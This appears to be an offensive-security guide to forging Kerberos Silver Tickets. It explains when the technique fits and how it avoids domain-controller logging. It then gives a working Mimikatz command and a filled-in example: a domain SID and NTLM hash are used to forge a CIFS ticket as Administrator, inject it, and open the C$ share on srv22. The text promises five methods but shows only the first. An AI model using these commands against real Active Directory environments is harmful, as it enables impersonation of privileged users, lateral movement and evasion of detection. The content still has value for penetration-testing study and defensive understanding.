# Silver Ticket: Complete Guide

A Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows you to access a specific service on a specific machine without needing the domain controller or the `krbtgt` hash.

---

## When to Use Silver Tickets

### Use When:
* You have the service account's NTLM hash (e.g., from Kerberoasting).
* You need access to a specific service (not the whole domain).
* You are on a machine and want to move laterally.
* The target machine's service is running under a known account.
* You do not have Domain Admin privileges but have a service account hash.
* You want to avoid detection (does not contact the Domain Controller for validation).

### Don't Use When:
* You have Domain Admin privileges (use a Golden Ticket instead).
* You need access to ALL services on a machine (use a Golden Ticket).
* You do not possess the target service account's hash.

---

## Why Use Silver Tickets?

| Reason | Explanation |
| :--- | :--- |
| **No DC Contact** | Service tickets are validated locally by the target service, not the Domain Controller. |
| **Less Detection** | No TGS request logs (Event ID 4769) are generated on the DC (only local logs on the target host). |
| **Works with Any Account** | You only need the service account's hash to forge access. |
| **Persistence** | The ticket remains functional even if the active account password changes (provided you use the correct corresponding hash). |
| **Quick Access** | Bypasses the requirement to crack complex passwords into cleartext. |

---

## How Many Ways to Create Silver Tickets?

There are 5 main methods commonly utilized to generate and leverage Silver Tickets:

### Method 1: Mimikatz (Windows - Most Common)

#### Syntax:
```powershell
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER_TO_IMPERSONATE> /ptt" exit

# Get Domain SID
whoami /user
# Output SID: S-1-5-21-3623811015-3361044348-30300820-1001

# Create Silver Ticket for CIFS (SMB) on SRV22 as Administrator
mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:srv22.resourced.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit

# Verify the ticket injection
klist

# Access target host file share
dir \\srv22.resourced.local\C$
```

